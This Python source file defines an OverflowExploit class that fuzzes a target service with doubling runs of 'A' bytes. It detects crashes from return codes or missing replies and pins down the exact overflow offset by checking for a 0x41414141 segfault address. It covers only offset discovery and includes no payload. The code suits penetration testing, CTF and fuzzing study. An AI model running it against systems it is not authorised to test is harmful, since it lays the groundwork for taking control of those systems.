import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
from dispatcher import Dispatcher

class OverflowExploit:
    def __init__(self, config: dict [str, str | bool | int], dispatcher: Dispatcher):
        """
        Initialize the OverflowExploit class.
        :param config: Configuration dictionary
        :param dispatcher: Dispatcher object to handle communication with the target
        :return: None
        """
        self.config = config
        self.dispatcher = dispatcher

        ## Config parsing ##
        self.verbose = config.get("verbose", False)
        self.expected_responses = config.get("expected_responses", [])

        self.bof_offset = None

    def try_overflow(self) -> int:
        """
        Attempt to find a buffer overflow by sending increasing sizes of input.
        :return: Size of the buffer that caused the overflow, or -1 if none found
        """
        buffer_size = 16
        while buffer_size <= 2048:
            try:
                if self.verbose:
                    print(f"[+] Trying buffer size: {buffer_size}")

                self.dispatcher.connect()

                command = b"A" * buffer_size

                # Execute the command and check for buffer overflow
                try:
                    return_code = self.dispatcher.send_command(command)
                    if self.verbose:
                        print(f"[+] Return code: {return_code} for size {buffer_size}")
                    if return_code == -11:
                        print(f"[!] Possible buffer overflow detected with size {buffer_size}")
                        return buffer_size
                    elif return_code == 132:
                        print(f"[!] Illegal instruction detected with size {buffer_size}")
                        return buffer_size
                except Exception as e:
                    print(f"[!] Possible overflow detected with size {buffer_size}: {e}")

                # Receive the response
                response = self.dispatcher.receive_response()
                if self.verbose:
                    print(f"[+] Received response: {response}")     
                if not response:
                    print("[-] No response received.")
                    print("[!] Possible buffer overflow detected.")
                    return buffer_size
                if len(self.expected_responses) > 0:
                    if response not in self.expected_responses:
                        print("[-] Unexpected response received.")
                        print("[!] Possible buffer overflow detected.")
                        return buffer_size
                    
            except Exception as e:
                print(f"[-] Error during overflow attempt with size {buffer_size}: {e}")
                return buffer_size
            finally:
                self.dispatcher.close()
            buffer_size *= 2
        return -1

    def adjust_buffer_size(self, size: int) -> int:
        """
        Adjust the buffer size to find the exact overflow offset.
        :param size: Initial buffer size that caused overflow
        :return: Exact offset of the buffer overflow
        """
        for _size in range(size // 2, size * 2 + 1):
            address_segfault = self.dispatcher.get_segfault(b"A" * _size)
            if address_segfault != None and str(address_segfault) == "0x41414141":
                print(f"[+] Find the buffer overflow offset: {_size - 4}")
                return _size - 4
        print("[!] No matching segfault address found, using original size.")
        return size

    def find_bof_offset(self) -> int:
        """
        Find the buffer overflow offset by attempting to overflow the buffer
        and then adjusting the buffer size to find the exact offset.
        :return: Exact offset of the buffer overflow, or -1 if none found
        """
        buffer_size = self.try_overflow()
        if buffer_size == -1:
            return -1
        self.bof_offset = self.adjust_buffer_size(buffer_size)
        return self.bof_offset